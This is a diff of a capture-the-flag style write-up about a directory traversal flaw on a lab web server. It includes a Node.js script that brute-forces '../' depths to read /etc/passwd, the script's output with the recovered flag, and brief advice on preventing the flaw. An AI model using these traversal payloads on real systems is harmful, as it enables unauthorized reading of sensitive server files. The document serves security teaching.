@@ -1,4 +1,4 @@
-# Directoy traversal breach
+# Directory traversal breach
 
 ## How we found the breach
 
@@ -20,7 +20,7 @@ A commonly hacked sensitive file is the `/etc/passwd` containing a trace of ever
 
 ### Testing the /etc/passwd access
 
-By hitting `http://IP/?page=signin` the server returns a page displaying an alert modal containing the label `WTF`
+By hitting `http://IP/?page=/etc/passwd` the server returns a page displaying an alert modal containing the label `WTF`:
 
 ```html
 <script>alert('Wtf ?');</script><!DOCTYPE HTML>
@@ -37,7 +37,7 @@ By hitting `http://IP/?page=signin` the server returns a page displaying an aler
 		<script 
 ```
 
-We can see that the server append a script tag on the beginning of the page.
+We can see that the server appends a script tag at the beginning of the page.
 
 We need to dig deeper, considering that the served page could be located recursively anywhere in folders.
 
@@ -45,7 +45,7 @@ The required file path could have infinite number of `..`, this is why we'll nee
 
 ### The script
 
-The following script will download the returned page for any `../etc/passwd` combination until he found within the first script tag the string `flag`. 
+The following script will download the returned page for any `../<...>/../etc/passwd` combination until he found within the first script tag the string `flag`.
 
 Note: This script assumes that the server will send back the flag in the first script tag, and even more that the flag will be displayed using the `flag` appellation.
 
@@ -58,7 +58,6 @@ const searchedFile = `/etc/passwd`
 const baseUrl = `http://192.168.56.101/?page=`
 
 async function traverseDirectory(query) {
-
     const url = baseUrl + query;
     const htmlPage = await got(url).text()
 
@@ -77,30 +76,38 @@ async function traverseDirectory(query) {
 
 await traverseDirectory(searchedFile)
 ```
+
 By running the script we get the below output:
 
 ```bash
 node script.js 
 
+http://192.168.56.101/?page=../etc/passwd
 alert('Wtf ?');
-alert('Wtf ?');
+http://192.168.56.101/?page=../../etc/passwd
 alert('Wrong..');
+http://192.168.56.101/?page=../../../etc/passwd
 alert('Nope..');
+http://192.168.56.101/?page=../../../../etc/passwd
 alert('Almost.');
+http://192.168.56.101/?page=../../../../../etc/passwd
 alert('Still nope..');
+http://192.168.56.101/?page=../../../../../../etc/passwd
 alert('Nope..');
+http://192.168.56.101/?page=../../../../../../../etc/passwd
 alert('Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 ');
 ```
 
+From the output we can see that passing the query `../../../../../../../etc/passwd` returns a flag!
+
 ## How to exploit the breach
 
-By being able to browse the server file system the hacker could steal any kind of sensitive information.
-He could also be able to execute previously uploaded script inside the server file tree
+By being able to browse the server file system the hacker could steal any kind of sensitive information. He could also be able to execute previously uploaded script inside the server file tree.
 
-[See file upload breach →](../../php_script_as_jpg_metadata_file_upload_breach/Ressources/Explanations.md)
+[See file upload breach →](../../php_script_as_jpg_metadata_file_upload_breach/Ressources/Explanation.md)
 
 ## How to avoid the breach
 
-To avoid this breach is kinda the same thing as for the [Redirect security breach](../../mocking_referer_and_user_agent_curl_breach/Ressources/Explanations.md). The server should not be passing user-supplied input to the filesystem.
+The solutions to avoid this breach are quite similar to those for [Redirect security breach](../../query_param_driving_redirection/Ressources/Explanation.md). The server should not build a path to local filesystem with user-supplied input.
 
-Either if it's necessary the server should be validating the input, using a `whitelist` `escaping` the received path.
+If it's necessary for the application to allow users to access files on the filesystem of the server, the server should validate the path sent by the user, to only allow access to authorized directories.
